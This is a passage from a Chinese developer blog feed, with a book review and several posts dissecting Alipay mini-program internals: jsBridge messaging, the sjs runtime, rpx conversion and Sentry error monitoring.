        <content type="html"><![CDATA[<p>以前读过蝴蝶书🦋，对作者印象深刻，jsLint 尝试用过，几乎不可配置，在我的地盘，你就得乖乖听我的。</p><p>《JavaScript 悟道》这本书英文版本是 2019 年出版，中文版出的速度还是挺不错的，虽然 es 规范现在年年更新，但是书本身并不落伍。</p><h2 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h2><p>这本书是 死月 翻译的，谈不上信达雅，有卖弄文笔之嫌。</p><blockquote><p><strong>底型</strong>是用于指示递归数据结构结尾的特殊值, 也可用于表示值不存在。 在一般的编程语言中, 常以 nil、none、nothing 或者 null 表示。。</p></blockquote><p><code>底型</code>这个翻译和把 <code>Promise</code> 翻译为 <code>期约</code>有异曲同工之妙，生搬硬造。</p><p>我对 <code>底型</code> 这边翻译感觉莫名其妙，其他翻译也还好，不要因为一点翻译上面的瑕疵错过了这本书。</p><h2 id="如何阅读"><a href="#如何阅读" class="headerlink" title="如何阅读"></a>如何阅读</h2><p>看看就好，作者非常非常有个性，取其精华。</p><h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><p>内容很有意思，除了正经的 JavaScript 知识点外，作者还详细的阐述了 JSON 的发明过程，对从侧面理解 JOSN 对不同类型的转换很有帮助。<br>不感兴趣的内容跳过，包括，数值高精度部分，neo 部分。</p><h2 id="读书笔记"><a href="#读书笔记" class="headerlink" title="读书笔记"></a>读书笔记</h2><p><img src="/images/JavaScript%E6%82%9F%E9%81%93_withMarginNotes.jpg" alt="JavaScript悟道_withMarginNotes"></p>]]></content>
      
      
      <categories>
          
          <category> reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解支付宝小程序 -- 杂篇</title>
      <link href="/2021/07/31/front-end/deep-in-alipay-mini-program-4/"/>
      <url>/2021/07/31/front-end/deep-in-alipay-mini-program-4/</url>
      
        <content type="html"><![CDATA[<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p><img src="/images/16277437284539.jpg"></p><p>小程序的路由是多个 <code>iframe</code> 的堆叠，每个<code>iframe</code> 运行在独立的 <code>webview</code> 中。</p><p><img src="/images/16277438543708.jpg"></p><h2 id="sass-scss"><a href="#sass-scss" class="headerlink" title="sass/scss"></a>sass/scss</h2><p>小程序的本身应该是支持 sass 预编译的处理的，在相关目录中能够看到这部分的 <code>node_modules</code> 文件，但是不知道如何正确开启。</p><h2 id="sourceMap"><a href="#sourceMap" class="headerlink" title="sourceMap"></a>sourceMap</h2><p>小程序本身是生成了 sourceMap 文件的(还记得 mini-pkg-builder 嘛)，但是对外的开放好像很少，只有在 IDE 中按天查看，生成的日志信息也偏少，感觉这一块还是有很大一部分内容，没有开放出来。希望这部分能力，尽快开放出来，对我们排查问题帮助很大。</p><p>我们本地其实是有 sourceMap 文件的，所以这里是否有可能构建我们自己的异常排查系统，比如说接入 <code>sentry</code>? </p><p><img src="/images/16277471509237.jpg"></p><p>引入 <code>sentry</code>，小程序的异常被完美捕获，并且有行号和列号！而我们是有 <code>sourceMap</code> 文件的~，搭建一个我们自己的异常监控已经具备一定的可行性。<code>sentry</code> 提供了时间、趋势、设备型号、错误数量。啊，再也不想用那个简陋的异常系统了。</p><p>只需要在项目上传时候，多执行一次命令，把生成物的 <code>sourceMap</code> 传到 <code>sentry</code> 上面，想想真是美滋滋~</p><h2 id="网络请求"><a href="#网络请求" class="headerlink" title="网络请求"></a>网络请求</h2><p>小程序的网络请求都是通过 <code>my.request</code> 进行，不是 <code>webview</code> 部分发送，是原生在发送请求。</p><ul><li>不存在跨域的情况</li><li>网络请求白名单机制</li><li>容易监控</li></ul><p>小程序在打包审核时候，它的白名单已经是确定的了，所以网络请求应该是直接拿的小程序的配置文件去初始化白名单。</p><h2 id="暂停，为了更好的前进"><a href="#暂停，为了更好的前进" class="headerlink" title="暂停，为了更好的前进"></a>暂停，为了更好的前进</h2><p>运行时分析到这里，远远没有结束，比如 <code>jsBridge</code> 如何被注入，其中的内容是什么。原生组件的渲染、<code>my</code> 方法的实现、小程序的插件机制等等，但是这里可能先要告一个段落了，因为分析不下去了，没有原生知识、周边知识匮乏，越来越多的点需要靠猜测去支撑，与其误人子弟，不如回炉重新修炼。后续重新起航，继续深入分析支付宝小程序。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/81775922" target="_blank" rel="noopener">小程序底层实现原理及一些思考 - 知乎</a></li><li><a href="https://zhuanlan.zhihu.com/p/121815358" target="_blank" rel="noopener">小程序底层实现原理及一些思考（2） - 知乎</a></li><li><a href="https://mp.weixin.qq.com/s/PX7b_qV6tYKnN3ecoz9Ehw" target="_blank" rel="noopener">独家！支付宝首次披露其小程序技术架构</a></li><li><a href="https://juejin.cn/post/6882265367251517447" target="_blank" rel="noopener">利用sourceMap定位错误实践</a></li><li><a href="http://tiaocaoer.com/xcx_study/" target="_blank" rel="noopener">微信小程序开发专区 | 薛定喵君</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解支付宝小程序 -- event、jsBridge通信篇</title>
      <link href="/2021/07/31/front-end/deep-in-alipay-mini-program-3/"/>
      <url>/2021/07/31/front-end/deep-in-alipay-mini-program-3/</url>
      
        <content type="html"><![CDATA[<p>这篇我们将跟踪函数，尝试去分离出 <code>webview</code> 和 <code>worker</code> 的通信方式.</p><h2 id="分析方法"><a href="#分析方法" class="headerlink" title="分析方法"></a>分析方法</h2><p><img src="/images/16277398312977.jpg"></p><p>在调试模式中，对按钮事件打断点，一层一层跟下去，不要纠结细节，只关注核心实现。</p><h2 id="事件路径分析"><a href="#事件路径分析" class="headerlink" title="事件路径分析"></a>事件路径分析</h2><p><img src="/images/event.jpg" alt="事件分析"></p><p>事件的路径非常非常非常厂，图中省略了很多细节。简单来说，Dom 触发事件，被 <code>af-appx.min.js</code> 监听到，然后发送消息，这个消息被 <code>vendors.bundle.js</code> 接收到，一系列转换之后，发送给 <code>AlipayJSBridge</code>, ‘af-appx.worker.min.js’,<code>onMessage</code>接收到消息，进入业务代码流程，一系列转换之后，业务函数被调用，发送消息给<code>AlipayJSBridge</code>，页面重新渲染。</p><h2 id="小程序模型分析"><a href="#小程序模型分析" class="headerlink" title="小程序模型分析"></a>小程序模型分析</h2><p>这里其实很明确了，我们说的 webview 层，不是只有 html，而是一套封装了<code>事件处理、dom 操作、页面渲染、diff 算法</code>的接口。通过 <code>AlipayJSBridge</code> 页面层获取数据，然后根据数据，做一整套的渲染流程，其中有大量的 <code>js</code>代码，同时<code>sjs</code> 也在这一层。<br>业务层用户的代码也并不是被直接执行，其中存在着一套公共的处理系统，由这套系统去做用户代码的调度，同时这层代码去做 <code>AlipayJSBridge</code> 的沟通事务。</p><h2 id="如何保证事件的唯一性"><a href="#如何保证事件的唯一性" class="headerlink" title="如何保证事件的唯一性"></a>如何保证事件的唯一性</h2><p>事件的执行可能有快慢，先触发的并不一定先收到返回值，js 的异步特性，也不会允许线程阻塞去等待。小程序的处理很巧妙，一个 id 解决。<br><img src="/images/16277406930646.jpg"></p><p>这是 <code>af-appx.min.js</code> 发送的数据，注意其中的 <code>i</code>, 它是一个递增的值，这样发送和收到的消息就可以找到彼此了。<br>这里的消息发送，最终走向了：</p><pre class=" language-js"><code class="language-js">AlipayJSBridge<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span></code></pre><p>其中 t:’postmessage’,<br>e:<br><img src="/images/16277409067028.jpg"></p><p> 其中内部的 p，包含了传递的事件数据。</p><h2 id="页面通信分析"><a href="#页面通信分析" class="headerlink" title="页面通信分析"></a>页面通信分析</h2><p>从 webview 传递到逻辑层，都会触发 <code>this.port.postMessage</code>，我们尝试分离出触发 <code>this.port.postMessage</code> 的部分方法：</p><ul><li><code>invokeHostTargetMethod</code>: 用户事件触发: <code>tap</code></li><li><code>invokeHostPageMethod</code>: 页面级别事件：<code>reloadPage</code>、<code>getHostStartupParams</code>、<code>updateClientPerformance</code>、<code>reportProfile</code></li><li><code>invokeHostPageEvent</code>: 页面触发事件：<code>onPageScroll</code>、<code>onReachBottom</code>、<code>onResize</code></li><li><code>invokeHostBridgeCallProxy</code>: 页面路由相关：<code>navigateTo</code>、<code>switchTab</code></li><li><code>invokeHMR</code>：热更新？</li><li><code>onPageNotFound</code>: 页面未发现</li></ul><p>这些事件会触发相应的方法，调用 <code>AlipayJSBridge</code>, 实现页面和 <code>worker</code> 的通信。</p><h2 id="webview-渲染层"><a href="#webview-渲染层" class="headerlink" title="webview 渲染层"></a>webview 渲染层</h2><p>小程序的 webview 层可能部分使用了 React，在项目里面可以看到引用了 react 相关的库。不需要重新造轮子。react 本身也是一套非常精简的框架，只关注 ui 渲染。</p><p>网上找到相关资料：</p><blockquote><p>我们选择 WebAssembly 作为虚拟 dom 的实现方向，WebAssembly 是一个新的 Web 标准，它定义了网页中的可执行代码的二进制格式和相应的类似汇编语言格式。他的目标是使执行代码几乎与本地机器代码一样快，它被用来作为 JavaScript 的补充，以加速 Web 应用程序的性能关键部分，所以我们使用 WebAssembly 技术重新实现了虚拟 dom 这块的核心代码，提升了小程序的页面渲染。</p></blockquote><p>对 WebAssembly 不熟悉，暂时无法进一步深入。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/81775922" target="_blank" rel="noopener">小程序底层实现原理及一些思考 - 知乎</a></li><li><a href="https://zhuanlan.zhihu.com/p/121815358" target="_blank" rel="noopener">小程序底层实现原理及一些思考（2） - 知乎</a></li><li><a href="https://mp.weixin.qq.com/s/PX7b_qV6tYKnN3ecoz9Ehw" target="_blank" rel="noopener">独家！支付宝首次披露其小程序技术架构</a></li><li><a href="https://juejin.cn/post/6882265367251517447" target="_blank" rel="noopener">利用sourceMap定位错误实践</a></li><li><a href="http://tiaocaoer.com/xcx_study/" target="_blank" rel="noopener">微信小程序开发专区 | 薛定喵君</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解支付宝小程序 -- sjs 篇</title>
      <link href="/2021/07/31/front-end/deep-in-alipay-mini-program-2/"/>
      <url>/2021/07/31/front-end/deep-in-alipay-mini-program-2/</url>
      
        <content type="html"><![CDATA[<p>在平时的开发中，我们很少会主动去使用 <code>sjs</code>，程序能够运行，不加班，已经是极好的事情了:)。但我们这个系列不可以，深入原理部分，必须对每一个细节都了若指掌，差之毫厘谬以千里。</p><h2 id="sjs-定义"><a href="#sjs-定义" class="headerlink" title="sjs 定义"></a>sjs 定义</h2><p>以下是官方定义：</p><blockquote><p>SJS（safe/subset javascript）是小程序一套自定义脚本语言，可以在 AXML 中使用其构建页面结构。 SJS 是 JavaScript 语言的子集，与 JavaScript 是不同的语言，其语法并不与 JavaScript 一致，请勿将其等同于 JavaScript。</p></blockquote><ul><li>sjs 中只支持使用 import、export 管理模块依赖。</li><li>sjs 只能定义在 .sjs 文件中。然后在 axml 中使用 <import-sjs> 标签引入。</li><li>sjs 可以调用其他 sjs 文件中定义的函数。</li><li>sjs 是 JavaScript 语言的子集，请勿将其等同于 JavaScript。</li><li>sjs 的运行环境和其他 JavaScript 代码是隔离的， sjs 中不能调用其他 JavaScript 文件中定义的函数，也不能调用小程序提供的 API。</li><li>sjs 函数不能作为组件事件回调。</li><li>sjs 不依赖于基础库版本，可以在所有版本小程序中运行。</li><li>sjs 可以响应事件</li></ul><p>简单理解：<code>sjs</code> 是js的子集，运行在受限的容器中，一般不能修改业务数据，可以响应事件。</p><h2 id="深入分析-sjs"><a href="#深入分析-sjs" class="headerlink" title="深入分析 sjs"></a>深入分析 sjs</h2><h3 id="不同的报错"><a href="#不同的报错" class="headerlink" title="不同的报错"></a>不同的报错</h3><!--我们在第0篇分析过`mini-pkg-builder`文件，这里我们换一个思路。--><p>我们尝试在业务代码和 <code>sjs</code> 中使用 <code>eval</code> 函数，两者提示不一样：</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// af-appx.worker.min.js</span>TypeError<span class="token punctuation">:</span> eval is not a <span class="token keyword">function</span><span class="token comment" spellcheck="true">// VM194 index.html:3 Module build failed (from /snapshot/code-repo/out/target/bundle/node_modules/@ali/antcube-thread-loader/lib/cjs.js):</span>SyntaxError<span class="token punctuation">:</span> <span class="token function">identifier</span><span class="token punctuation">(</span>eval<span class="token punctuation">)</span> is disallowed <span class="token keyword">in</span> sjs</code></pre><p>注意这里两个报错是不一样的！在<code>af-appx.worker.min.js</code> 中，eval 并全局指向了 <code>undefined</code>, 在 sjs 中，<code>eval</code> 是不被运行使用。不被允许，并不是不存在的意思，也就是这个方法是存在的，只是我不让你使用。</p><h3 id="双线程架构"><a href="#双线程架构" class="headerlink" title="双线程架构"></a>双线程架构</h3><p>小程序的架构中 js 一般在独立线程中执行，页面的渲染在 <code>webview</code> 中执行，两者通过 <code>jsbridge</code> 进行通信。那么 <code>sjs</code> 在哪里执行？<br>这一次我们使用miniu构建我们的小程序，我们分析小程序打包的代码：<br>目录结构<br>.<br>├── appConfig.json<br>├── assets<br>│   └── logo.png<br>├── index.html<br>├── index.js<br>├── index.worker.html<br>├── index.worker.js<br>└── manifest.json</p><p>index.html 中文件的加载顺序</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    window<span class="token punctuation">.</span><span class="token function">bootstrapApp</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      worker<span class="token punctuation">:</span> <span class="token string">'index.worker.js?version=1627720007775a8392433130335686'</span><span class="token punctuation">,</span>      onReady<span class="token punctuation">:</span> onReady<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>页面在加载时候，会先加载 <code>index.js</code> 文件，然后启动 works，执行用户的业务代码。<br>我们的 <code>sjs</code> 代码被打入 <code>index.js</code> 中，这里我把 <code>a:222</code>,改成了<code>a=eval(333)</code>,页面正常显示。<br><img src="/images/16277221107831.jpg"></p><p><code>index.sjs</code> 应该并不是用户逻辑的代码，而是服务于<code>webview</code>部分的代码，所有和webview 相关的代码都被放到了这里，它的运行环境就是 <code>webview</code>。<br>我们继续尝试，<code>a</code> 改成 <code>window.innerHeight</code>,页面运行成功，显示 <code>595</code> 高度，验证了我们的猜想，这里可以访问到完整的 <code>webview</code> 环境。</p><h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><p>小程序各种安全体系下，<code>sjs</code> 比较容易产生风险。<br>小程序打包需要执行 <code>mini-pkg-builder</code> 程序，我们在本地预览，远程调试时候，都是他在做小程序的打包工作，这是一个加密的 unix 可执行文件，尝试反编译，无果。</p><p>我们小程序上传时候，会在服务端的容器中执行 <code>mini-pkg-builder</code> 程序。保证了程序本身不会被用户影响，即使本地尝试修改这个文件，也不会影响到正式发布。</p><p>然而，攻与防从来都是相对的，这里会不会存在逻辑bug，就不得而知了，有趣的你是不是跃跃欲试了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/81775922" target="_blank" rel="noopener">小程序底层实现原理及一些思考 - 知乎</a></li><li><a href="https://zhuanlan.zhihu.com/p/121815358" target="_blank" rel="noopener">小程序底层实现原理及一些思考（2） - 知乎</a></li><li><a href="https://mp.weixin.qq.com/s/PX7b_qV6tYKnN3ecoz9Ehw" target="_blank" rel="noopener">独家！支付宝首次披露其小程序技术架构</a></li><li><a href="https://juejin.cn/post/6882265367251517447" target="_blank" rel="noopener">利用sourceMap定位错误实践</a></li><li><a href="http://tiaocaoer.com/xcx_study/" target="_blank" rel="noopener">微信小程序开发专区 | 薛定喵君</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解支付宝小程序 -- web Components、rpx 篇</title>
      <link href="/2021/07/31/front-end/deep-in-alipay-mini-program-1/"/>
      <url>/2021/07/31/front-end/deep-in-alipay-mini-program-1/</url>
      
        <content type="html"><![CDATA[<h2 id="web-Components"><a href="#web-Components" class="headerlink" title="web Components"></a>web Components</h2><h3 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h3><p>调试ide版本：v1.02.1907300<br>微信小程序 ide 使用 nw.js 开发，我们可以尝试打开它的控制台</p><pre class=" language-js"><code class="language-js">document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'webview'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">showDevTools</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span></code></pre><p><img src="/images/16272568175378.jpg"></p><p>我们拿到了微信小程序的渲染层页面，注意body中的标签 <code>wx-view</code>、<code>wx-open-data</code>，这看起来是一种类似 <code>web Components</code>的实现，这是一种浏览器原生支持的组件形式。</p><h3 id="支付宝小程序"><a href="#支付宝小程序" class="headerlink" title="支付宝小程序"></a>支付宝小程序</h3><p>调试 ide 版本：2.1.9<br>支付宝小程序是使用 Electron 开发的，我们也可以打开它的控制台：</p><pre class=" language-js"><code class="language-js">document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'webview'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">openDevTools</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>外部套着模拟器，内部是<code>iframe</code>，这里应该就是小程序本身代码，也就是 <code>iframe</code> 部分<br><img src="/images/16272573416726.jpg"></p><p>这里并没有和小程序类采用了组件的形式，而是<code>原生标签 + class</code>的形式。尝试全局修改<code>a-view</code>的样式，竟然真的生效了。<br>进一步测试发现，标签选择器会被编译成<code>.a-*</code>的形式，不局限于已有的标签，如果是<code>a</code>标签也会这样编译。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>微信小程序的标签需要基础库去解析，支付宝这里似乎是没有的，他直接编译成了<code>html</code>,并且<code>html</code>没有做到样式隔离，能够被外部影响。如果无意中写了类似标签，还是非常难以排查的。</p><h2 id="rpx"><a href="#rpx" class="headerlink" title="rpx"></a>rpx</h2><p>rpx 是小程序平台的响应式单位。</p><blockquote><p>rpx（responsive pixel）可以根据屏幕宽度进行自适应，规定屏幕宽为 750rpx。以 Apple iPhone6 为例，屏幕宽度为 375px，共有 750 个物理像素，则 750 rpx = 375 px = 750 物理像素，1rpx = 0.5 px = 1 物理像素。</p></blockquote><h3 id="微信小程序-1"><a href="#微信小程序-1" class="headerlink" title="微信小程序"></a>微信小程序</h3><p>viewport 设置</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"viewport"</span> content<span class="token operator">=</span><span class="token string">"width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1"</span><span class="token operator">></span></code></pre><p>rpx 转换：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> BASE_DEVICE_WIDTH <span class="token operator">=</span> <span class="token number">750</span><span class="token punctuation">;</span><span class="token keyword">var</span> isIOS <span class="token operator">=</span> navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token string">'iPhone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> deviceWidth <span class="token operator">=</span> window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>width <span class="token operator">||</span> <span class="token number">375</span><span class="token punctuation">;</span><span class="token keyword">var</span> deviceDPR <span class="token operator">=</span> window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">||</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">var</span> checkDeviceWidth <span class="token operator">=</span>  window<span class="token punctuation">.</span>__checkDeviceWidth__ <span class="token operator">||</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> newDeviceWidth <span class="token operator">=</span> window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>width <span class="token operator">||</span> <span class="token number">375</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> newDeviceDPR <span class="token operator">=</span> window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">||</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> newDeviceHeight <span class="token operator">=</span> window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>height <span class="token operator">||</span> <span class="token number">375</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>orientation <span class="token operator">&amp;&amp;</span> <span class="token regex">/^landscape/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>orientation<span class="token punctuation">.</span>type <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> newDeviceWidth <span class="token operator">=</span> newDeviceHeight<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newDeviceWidth <span class="token operator">!==</span> deviceWidth <span class="token operator">||</span> newDeviceDPR <span class="token operator">!==</span> deviceDPR<span class="token punctuation">)</span> <span class="token punctuation">{</span>      deviceWidth <span class="token operator">=</span> newDeviceWidth<span class="token punctuation">;</span>      deviceDPR <span class="token operator">=</span> newDeviceDPR<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">checkDeviceWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> eps <span class="token operator">=</span> <span class="token number">1e-4</span><span class="token punctuation">;</span><span class="token keyword">var</span> transformRPX <span class="token operator">=</span>  window<span class="token punctuation">.</span>__transformRpx__ <span class="token operator">||</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span>number<span class="token punctuation">,</span> newDeviceWidth<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>number <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    number <span class="token operator">=</span> <span class="token punctuation">(</span>number <span class="token operator">/</span> BASE_DEVICE_WIDTH<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>newDeviceWidth <span class="token operator">||</span> deviceWidth<span class="token punctuation">)</span><span class="token punctuation">;</span>    number <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>number <span class="token operator">+</span> eps<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>number <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>deviceDPR <span class="token operator">===</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">!</span>isIOS<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0.5</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> number<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3 id="支付宝小程序-1"><a href="#支付宝小程序-1" class="headerlink" title="支付宝小程序"></a>支付宝小程序</h3><p>viewport 设置</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"viewport"</span> content<span class="token operator">=</span><span class="token string">"width=device-width, initial-scale=1, user-scalable=0, viewport-fit=cover"</span><span class="token operator">></span></code></pre><p>根字体设置:</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// af-appx.min.js</span><span class="token keyword">function</span> <span class="token function">Sy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        _y <span class="token operator">=</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientWidth<span class="token punctuation">,</span> xy <span class="token operator">=</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientHeight<span class="token punctuation">,</span> wy <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>_y<span class="token punctuation">,</span> xy<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token number">100</span> <span class="token operator">*</span> _y <span class="token operator">/</span> <span class="token number">750</span> <span class="token operator">+</span> <span class="token string">"px"</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>style<span class="token punctuation">.</span>fontSize <span class="token operator">!==</span> t <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>style<span class="token punctuation">.</span>fontSize <span class="token operator">=</span> t<span class="token punctuation">)</span>    <span class="token punctuation">}</span></code></pre><p>编译之后的样式文件：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">/*ACSSCompileContext:{"atImports":[]}*/</span><span class="token keyword">var</span> internal_style<span class="token punctuation">;</span>internal_style <span class="token operator">=</span> <span class="token string">".title {background:red;font-size:0.5rem}.ttt {font-size:0.5rem}.hair {height:1px}.a-view {background:orange}.ttt .a-a {font-size:100px!important}#id {font-size:1rem}"</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> internal_style<span class="token punctuation">;</span></code></pre><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>微信小程序，rpx 被转换成了px。支付宝小程设置了根字体，rpx 最终被转换成了 rem。支付宝根字体的转换找到了代码，rpx 转 px 没有找到代码，猜测，应该是在编译过程中已经进行了转换，我分析的运行时部分没有这部分代码。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>貌似一样的众多小程序，仔细分析，发现还是有很多很多的不同，某些不同，还是基础架构层面的不同，深入分析，应该可以挖掘出更多有意思的东西。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/81775922" target="_blank" rel="noopener">小程序底层实现原理及一些思考 - 知乎</a></li><li><a href="https://zhuanlan.zhihu.com/p/121815358" target="_blank" rel="noopener">小程序底层实现原理及一些思考（2） - 知乎</a></li><li><a href="https://mp.weixin.qq.com/s/PX7b_qV6tYKnN3ecoz9Ehw" target="_blank" rel="noopener">独家！支付宝首次披露其小程序技术架构</a></li><li><a href="https://juejin.cn/post/6882265367251517447" target="_blank" rel="noopener">利用sourceMap定位错误实践</a></li><li><a href="http://tiaocaoer.com/xcx_study/" target="_blank" rel="noopener">微信小程序开发专区 | 薛定喵君</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解支付宝小程序 -- 准备篇</title>
      <link href="/2021/07/31/front-end/deep-in-alipay-mini-program-0/"/>
      <url>/2021/07/31/front-end/deep-in-alipay-mini-program-0/</url>
      
